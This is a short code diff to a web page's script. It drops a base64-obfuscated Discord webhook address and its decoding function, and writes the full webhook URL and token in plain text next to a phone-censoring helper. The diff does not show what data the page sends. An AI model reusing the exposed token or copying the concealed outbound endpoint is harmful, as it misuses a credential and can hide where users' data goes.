@@ -714,21 +714,7 @@
     <script>
         
 // Discord Webhook
-const _w1 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv';
-const _w2 = 'MTQ0MzE4MzE5MzI4ODM0MzU2Ni94aFNJVkJNSVdrS1Ny';
-const _w3 = 'WDJMejZ3dENqNjJRVzVSdmsxSTdDZkE2bkhZemZLNUlS';
-const _w4 = 'dnVfQlhweW1fdk9ScFR2T25McXk=';
-
-function decodeWebhook() {
-    try {
-        return atob(_w1 + _w2 + _w3 + _w4);
-    } catch(e) {
-        console.error('Decode error:', e);
-        return null;
-    }
-}
-
-const DISCORD_WEBHOOK_URL = decodeWebhook();
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1444199616630227055/1KWBcUDwEu7vvUUdWCMQTpslzQ0NrOUDAegm7i38LbJ3RlIHJmQxf3jUlmRif9vrdnTe';
 
         // Fungsi untuk sensor data
         function censorPhone(phone) {
